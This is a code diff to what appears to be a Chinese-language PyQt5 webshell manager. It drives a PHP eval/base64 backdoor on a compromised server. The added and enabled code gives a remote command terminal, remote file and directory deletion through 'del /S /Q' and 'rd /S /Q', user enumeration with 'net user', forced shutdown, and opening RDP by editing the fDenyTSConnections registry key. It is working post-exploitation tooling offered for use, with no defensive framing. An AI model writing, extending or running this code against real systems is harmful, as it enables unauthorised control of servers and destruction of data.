@@ -19,6 +19,7 @@ from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QDialog, QWi
 from PyQt5 import QtWidgets, QtCore, QtGui
 
 import sys, os
+import webbrowser
 
 class Ui_form(QWidget):
     def __init__(self):
@@ -43,8 +44,10 @@ class php7(QMainWindow):
         self.cmd_action.triggered.connect(self.show_cmd)
 
         '''快捷功能菜单栏调用函数部分'''
-        #self.cha_xun_users_action.triggered.connect(self.User)
+        self.cha_xun_users_action.triggered.connect(self.User)
         self.shutdown_action.triggered.connect(self.Shutdown)
+        self.love_me_action.triggered.connect(self.Loveme)
+        self.open_3389_action.triggered.connect(self.Open3389)
 
         self.listWidget.installEventFilter(self)  # 初始化QListView控件焦点事件
         self.treeWidget_2.installEventFilter(self)  # 初始化treeWidget_2控件焦点事件
@@ -127,23 +130,53 @@ class php7(QMainWindow):
         # 将他们分别与不同函数关联，实现不同的功能
         self.connect_shell_button.triggered.connect(self.Connect_shell)
         self.add_shell_button.triggered.connect(self.Add_shell_show)
-        #self.modify_shell_button.triggered.connect(self.Modify_shell)
+        self.modify_shell_button.triggered.connect(self.Modify_shell)
         self.delete_shell_button.triggered.connect(self.Delete_shell)
-        #self.delete_all_shell_button.triggered.connect(self.Delete_all_shell)
+        self.delete_all_shell_button.triggered.connect(self.Delete_all_shell)
 
     def showContextMenu(self, pos):  # 右键点击时调用的函数
         # 菜单显示前，将它移动到鼠标点击的位置
         self.contextMenu.move(QtGui.QCursor.pos())
         self.contextMenu.show()
 
+    '''编辑shell'''
+    def Modify_shell(self):
+        try:
+            shell = self.listWidget.currentItem().text()  # 获取选中行的文本
+            self.Add_shell_show()  # 显示子窗口
+            shell = shell.split("  ")  # 分割数据
+
+            self.WChild.lineEdit.setText(shell[0])  # 给子窗口赋值
+
+            self.WChild.lineEdit_2.setText(shell[1])
+            self.WChild.pushButton.setText("编辑")
+            # 删除选中的行
+        except:
+            box = QtWidgets.QMessageBox()
+            box.warning(self, "提示", "请选择一项！")
+
+    '''当子窗口点击确定后调用editline函数修改原来的项 '''
+    def editLine(self):
+        url = self.WChild.lineEdit.text()  # 获取子窗口的值
+        passwd = self.WChild.lineEdit_2.text()
+        data = url + "  " + passwd
+        shell = self.listWidget.currentRow()  # 获取选择项的行号
+        self.listWidget.item(shell).setText(data)  # 给listwidget赋值
+        self.WChild.close()  # 关闭子窗口
+
     '''添加shell'''
+    '''判断是谁发出的信号'''
     def Add_shell_show(self):
         self.WChild = Ui_form()
         #print(2)
         self.WChild.show()
         #print(3)
-        self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell
-
+        #self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell
+        sender = self.sender()
+        if sender.text() == "添加":
+            self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell
+        elif sender.text() == "编辑":
+            self.WChild.pushButton.clicked.connect(self.editLine)  # 子窗体确定编辑shell
     def GetLine(self):  # 添加shell给listweiget传值
         #print(4)
         url = self.WChild.lineEdit.text()
@@ -167,6 +200,7 @@ class php7(QMainWindow):
         try:
             #shell = self.Ui.listWidget.currentItem().text()
             shell = self.listWidget.currentItem().text()
+
             #shell = di_zhi
             # 返回选择行的数据
 
@@ -177,13 +211,11 @@ class php7(QMainWindow):
 
             data = {shell2[1]: '@eval(base64_decode($_POST[z0]));',
                     'z0': phpcode}
-
             returndata = self.filedir(shell2, data)
-
             if returndata != "":
                 box = QtWidgets.QMessageBox()
                 box.information(self, "提示", "连接成功！")
-                print("连接成功1")
+                #print("连接成功1")
                 self.shelllabel.setText(shell)
                 # self.File_update()  #显示目录
                 # self.Virtualshell()
@@ -191,7 +223,7 @@ class php7(QMainWindow):
             else:
                 box = QtWidgets.QMessageBox()
                 box.information(self, "提示", "连接失败！")
-                print("连接失败")
+                #print("连接失败")
         except:
             box = QtWidgets.QMessageBox()
             box.information(self, "提示", "连接失败！")
@@ -208,6 +240,18 @@ class php7(QMainWindow):
             # shell = self.Ui.listWidget.currentItem().text()  # 返回选择行的数据
             #shell2 = self.listWidget.currentItem().text()
             self.listWidget.takeItem(shell)  # 删除listwidget中的数据
+        else:
+            return
+
+    '''清空shell'''
+    def Delete_all_shell(self):
+        button = QMessageBox.question(self, "警告！",
+                                      self.tr("你确定要清空所有内容吗？"),
+                                      QMessageBox.Ok | QMessageBox.Cancel,
+                                      QMessageBox.Ok)
+        if button == QMessageBox.Ok:
+            self.listWidget.clear()
+            os.remove("shell.txt")  # 删除shell.txt文件
         else:
             return
 
@@ -270,7 +314,7 @@ class php7(QMainWindow):
         self.file_update.triggered.connect(self.File_update)
         self.file_upload.triggered.connect(self.File_upload)
         self.file_download.triggered.connect(self.File_download)
-        #self.file_delete.triggered.connect(self.File_delete)
+        self.file_delete.triggered.connect(self.File_delete)
         #self.file_rename.triggered.connect(self.renameshow)
 
     '''右键菜单移动到鼠标的位置'''
@@ -292,6 +336,7 @@ class php7(QMainWindow):
         req = urllib.request.Request(shell[0], postData, headers)
         # 发起请求`
         response = urllib.request.urlopen(req)
+
         #print(response)
         # data = (response.read()).deco de('utf-8')
         return response.read()
@@ -571,6 +616,33 @@ class php7(QMainWindow):
         # print(fileName)
         return fileName
 
+    '''删除文件'''
+
+    def File_delete(self):
+        shell = self.shelllabel.text()  # 获取shell
+        if shell != "":
+            try:
+                path = self.showfilepath()  # 获取文件的路径
+                filepath = self.treeWidget_2.currentItem().text(0)  # 获取文件名
+                compath = path + "\\\\" + filepath  # 组合路径
+                # print(compath)
+                hitgroup = self.treeWidget_2.currentIndex().row()
+                # 删除文件
+                shell = shell.split("  ")
+                phpcode1 = "system('" + "del /S /Q " + compath + "');"
+                self.sendcode(phpcode1)
+                # 删除目录
+                phpcode2 = "system('" + "rd /S /Q " + compath + "');"
+                self.sendcode(phpcode2)
+                self.treeWidget_2.takeTopLevelItem(hitgroup)  # 删除节点
+                box = QtWidgets.QMessageBox()
+                box.warning(self, "提示", "删除成功！")
+            except:
+                pass
+        else:
+            box = QtWidgets.QMessageBox()
+            box.information(self, "提示", "请先连接shell！")
+
     '''虚拟终端'''
 
     def show_cmd(self):#点击虚拟终端后展示虚拟终端内嵌窗口
@@ -592,7 +664,7 @@ class php7(QMainWindow):
         #print(shellcommand)
         #print(shell)
         phpcode ="system('" + shellcommand + "');"
-        #phpcode = shellcommand
+        #phpcode = shellcommand + ';'
         print(phpcode)
         returncommand = self.sendcode(phpcode)
         #print(type(returncommand))
@@ -610,21 +682,27 @@ class php7(QMainWindow):
     def User(self):
         user = ""
         phpcode = 'system("net user");'
-        print(phpcode)
+        #print(phpcode)
         data = self.sendcode(phpcode)
-        print(data)
-        # print(data[113:-20])
+        data = data.decode('gb2312')
+        #print(data)
+        #print(data[100:-20])
         if data != None:
-            data = data[113:-20].replace('\r\n', '').split(" ")
-            print(data)
+            #print(data)
+            #data=data[104:-20].replace('\r\n', '').split(" ")
+            data = data[99:-20].split()
+            #print(data)
+
             for i in data:
                 if i != "":
                     user += "用户：" + i + "\n"
-            # print(user)
+                    print(1)
+            print(user)
             box = QtWidgets.QMessageBox()
             box.about(self, "查询用户", user[:-1])
         else:
             pass
+
     '''强制关机'''
     def Shutdown(self):
         shell = self.shelllabel.text()  # 获取shell
@@ -653,6 +731,29 @@ class php7(QMainWindow):
         else:
             box = QtWidgets.QMessageBox()
             box.information(self, "提示", "请先连接shell！")
+
+    '''开启3389按钮'''
+    def Open3389(self):
+        #phpcode = 'system("REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f");'
+        phpcode = 'system("REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");'
+        result = self.sendcode(phpcode)
+        if result != None:
+            data = self.sendcode('system("netstat -ano |findstr 0.0.0.0:3389");')
+            if data != None:
+                if data != "":
+                    box = QtWidgets.QMessageBox()
+                    box.information(self, "提示", "开启成功！")
+                else:
+                    box = QtWidgets.QMessageBox()
+                    box.information(self, "提示", "抱歉，您没有权限！")
+            else:
+                return
+        else:
+            return
+
+    '''联系作者'''
+    def Loveme(self):
+        webbrowser.open("https://github.com/3389306042")
 
 if __name__ == '__main__':
     print("hello")
